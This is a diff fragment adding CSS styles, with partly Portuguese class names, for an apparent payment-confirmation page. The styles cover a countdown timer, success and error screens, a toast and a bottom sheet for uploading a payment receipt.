+    .countdown-wrap { display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 13px; color: #666; margin-top: 14px; }
+    .countdown-num { font-weight: 700; color: #1351B4; }
+    .countdown-num.urgente { color: #DC2626; }
+    .aguardando { display: flex; align-items: center; justify-content: center; gap: 8px; background: #EFF6FF; border-radius: 8px; padding: 10px 14px; margin-top: 14px; font-size: 13px; font-weight: 600; color: #1351B4; }
+    .dot-blink { width: 8px; height: 8px; background: #1351B4; border-radius: 50%; animation: blink 1.2s infinite; }
+    @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: .2; } }
+    .success-screen { display: none; text-align: center; padding: 20px 0 10px; }
+    .success-icon { width: 72px; height: 72px; background: #D1FAE5; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 36px; }
+    .success-title { font-size: 20px; font-weight: 800; color: #059669; margin-bottom: 8px; }
+    .success-desc  { font-size: 14px; color: #555; line-height: 1.6; }
+    .erro-screen { display: none; text-align: center; padding: 10px 0; }
+    .erro-icon { font-size: 40px; margin-bottom: 12px; }
+    .erro-title { font-size: 16px; font-weight: 700; color: #DC2626; margin-bottom: 8px; }
+    .erro-desc { font-size: 13px; color: #666; margin-bottom: 16px; }
+    .btn-retry { background: #1351B4; color: #fff; border: none; border-radius: 8px; padding: 11px 24px; font-size: 14px; font-weight: 600; font-family: inherit; cursor: pointer; }
+    .btn-confirmar { width: 100%; padding: 14px; background: #1351B4; color: #fff; border: none; border-radius: 8px; font-size: 14px; font-weight: 700; font-family: inherit; cursor: pointer; transition: background .15s; margin-top: 20px; }
+    .btn-confirmar:hover { background: #0F4DA8; }
+    .footer { margin-top: 24px; text-align: center; font-size: 12px; color: #aaa; line-height: 1.7; }
+    .footer img { height: 22px; margin-bottom: 6px; opacity: .5; }
+    .ja-paguei-wrap { text-align: center; margin-top: 10px; }
+    .ja-paguei-link { color: #1351B4; font-size: 13px; font-weight: 600; text-decoration: underline; cursor: pointer; }
+    .ja-paguei-link:hover { color: #0F4DA8; }
+
+    .cp-toast { position: fixed; left: 50%; bottom: 24px; transform: translate(-50%, 24px); background: #0F172A; color: #fff; padding: 10px 16px; border-radius: 999px; font-size: 13px; font-weight: 600; display: flex; align-items: center; gap: 8px; opacity: 0; pointer-events: none; z-index: 10000; box-shadow: 0 12px 32px rgba(15, 23, 42, 0.35); transition: transform .3s cubic-bezier(0.32, 0.72, 0, 1), opacity .3s; max-width: calc(100% - 32px); white-space: nowrap; }
+    .cp-toast.open { opacity: 1; pointer-events: auto; transform: translate(-50%, 0); }
+    .cp-toast-ic { width: 22px; height: 22px; border-radius: 50%; background: rgba(255,255,255,0.14); color: #93C5FD; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+
+    .cp-sheet { position: fixed; inset: 0; z-index: 9999; pointer-events: none; }
+    .cp-sheet.open { pointer-events: auto; }
+    .cp-backdrop { position: absolute; inset: 0; background: rgba(15, 23, 42, 0.55); opacity: 0; transition: opacity .28s ease; backdrop-filter: blur(2px); -webkit-backdrop-filter: blur(2px); }
+    .cp-sheet.open .cp-backdrop { opacity: 1; }
+    .cp-panel { position: absolute; left: 0; right: 0; bottom: 0; background: #fff; border-top-left-radius: 22px; border-top-right-radius: 22px; padding: 6px 22px calc(20px + env(safe-area-inset-bottom)); box-shadow: 0 -18px 60px rgba(15, 23, 42, 0.25); transform: translateY(102%); transition: transform .38s cubic-bezier(0.32, 0.72, 0, 1); max-width: 500px; margin: 0 auto; max-height: 92vh; overflow-y: auto; overscroll-behavior: contain; -webkit-overflow-scrolling: touch; }
+    .cp-sheet.open .cp-panel { transform: translateY(0); }
+    .cp-handle { width: 40px; height: 4px; border-radius: 3px; background: #D0D5DD; margin: 4px auto 16px; }
+    .cp-view { display: flex; flex-direction: column; }
+    .cp-view[hidden] { display: none; }
+    .cp-title { font-size: 18px; font-weight: 800; color: #0F172A; margin-bottom: 6px; letter-spacing: -0.01em; }
+    .cp-desc { font-size: 13.5px; color: #475569; margin-bottom: 16px; line-height: 1.55; }
+    .cp-drop { display: flex; gap: 12px; align-items: center; width: 100%; padding: 14px; background: #F8FAFC; border: 1.5px dashed #94A3B8; border-radius: 12px; cursor: pointer; transition: background .15s, border-color .15s; margin-bottom: 14px; }
+    .cp-drop:hover { background: #EFF6FF; border-color: #1351B4; }
+    .cp-drop.has-file { background: #F0FDF4; border-color: #059669; border-style: solid; }
+    .cp-drop-ic { width: 42px; height: 42px; border-radius: 10px; background: #E0E7FF; color: #1351B4; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .cp-drop.has-file .cp-drop-ic { background: #D1FAE5; color: #059669; }
+    .cp-drop-txt { flex: 1; min-width: 0; }
+    .cp-drop-title { font-size: 14px; font-weight: 700; color: #0F172A; word-break: break-word; }
+    .cp-drop-sub { font-size: 12px; color: #64748B; margin-top: 2px; }
+    .cp-status { font-size: 13px; color: #64748B; min-height: 0; margin: 0 0 12px; text-align: center; font-weight: 500; }
+    .cp-status:empty { display: none; }
+    .cp-status.ok { color: #059669; }
+    .cp-status.err { color: #DC2626; }
+    .cp-submit { width: 100%; padding: 13px; background: #1351B4; color: #fff; border: none; border-radius: 10px; font-size: 15px; font-weight: 700; font-family: inherit; cursor: pointer; transition: background .15s, transform .15s; }
+    .cp-submit:hover:not(:disabled) { background: #0F4DA8; }
+    .cp-submit:active:not(:disabled) { transform: scale(0.985); }
+    .cp-submit:disabled { background: #CBD5E1; cursor: not-allowed; }
+    .cp-submit.enviado { background: #059669; }
+    .cp-secondary { width: 100%; padding: 12px; margin-top: 10px; background: transparent; color: #475569; border: none; border-radius: 10px; font-size: 14px; font-weight: 600; font-family: inherit; cursor: pointer; transition: background .15s; }
+    .cp-secondary:hover { background: #F1F5F9; color: #0F172A; }
+    .cp-already-ic { width: 56px; height: 56px; border-radius: 50%; background: #DBEAFE; color: #1351B4; display: flex; align-items: center; justify-content: center; margin: 8px auto 14px; }
+    #cp-view-already { text-align: center; }
+    #cp-view-already .cp-desc { margin-bottom: 20px; }
+    body.cp-lock { overflow: hidden; }
+    @media (min-width: 640px) and (min-height: 560px) {
+      .cp-panel { bottom: 24px; left: 50%; right: auto; transform: translate(-50%, calc(100% + 24px)); border-radius: 18px; width: calc(100% - 32px); max-width: 440px; max-height: calc(100vh - 48px); box-shadow: 0 24px 64px rgba(15, 23, 42, 0.28); padding: 6px 22px 22px; }
+      .cp-sheet.open .cp-panel { transform: translate(-50%, 0); }
+    }
+  </style>
+
+</body></html>
